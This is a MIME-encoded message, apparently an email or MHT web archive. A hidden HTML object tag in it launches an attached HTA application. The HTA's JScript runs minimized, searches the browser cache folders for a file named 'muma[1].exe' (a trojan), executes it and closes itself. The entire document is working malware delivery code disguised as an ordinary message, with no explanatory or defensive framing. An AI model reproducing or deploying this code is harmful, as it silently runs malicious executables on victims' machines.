MIME-Version: 1.0
Content-Type: multipart/mixed;boundary="1"

--1
Content-Type: multipart/alternative;boundary="2"

--2
Content-Type: text/html;charset="gb2312"
Content-Transfer-Encoding: quoted-printable

<HTML><BODY>
<OBJECT style=3D"display:none;" data=3Dcid:0></OBJECT>
</BODY></HTML>
--2--
--1
Content-Type:application/hta;name="0.hta"
Content-Transfer-Encoding: 7bit
Content-ID: <0>

<HTML>
<HEAD>
<TITLE>icyfox</TITLE>
<HTA:APPLICATION  BORDER="none" CAPTION="no" WINDOWSTATE="minimize">
</HEAD>
<BODY>
<SCRIPT LANGUAGE="JavaScript">
var wsh=new ActiveXObject("WScript.Shell");
var fso=new ActiveXObject("Scripting.FileSystemObject");
cache=wsh.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Cache");//��ȡע���õ�����Ŀ¼��
wj(cache);
function wj(b){
	var c=new Enumerator(fso.GetFolder(b).SubFolders);
	for (;!c.atEnd();c.moveNext()){
		var f=c.item().Path+"\\muma[1].exe";
		if(fso.FileExists(f)){
			wsh.Run('"'+f+'"');break;
		}
	wj(c.item());
	}
}
window.close();
</SCRIPT>
</BODY>
</HTML>
--1--